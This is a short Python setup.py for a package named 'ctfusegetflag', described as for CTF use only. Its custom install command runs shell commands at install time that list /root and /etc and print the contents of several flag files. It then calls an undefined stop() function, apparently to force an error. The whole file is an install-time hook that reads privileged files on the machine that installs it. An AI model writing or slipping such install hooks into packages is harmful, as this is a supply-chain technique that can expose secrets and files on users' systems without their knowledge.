from setuptools import setup
from setuptools.command.install import install
import base64
import os
import sys


class CInstall(install):
    def run(self):
        install.run(self)
        os.system('ls /root')
        os.system('ls /etc')
        print('enumflag:')
        os.system('cat /root/flag.txt')
        os.system('cat /root/flag')
        os.system('cat /etc/flag')
        os.system('cat /etc/flag.txt')
        os.system('cat /flag')
        os.system('cat /flag.txt')
        stop()

os.environ['PYTHONFAULTHANDLER'] = '1'
setup(name='ctfusegetflag',
      version='0.0.1',
      description='only use in ctf',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CInstall})
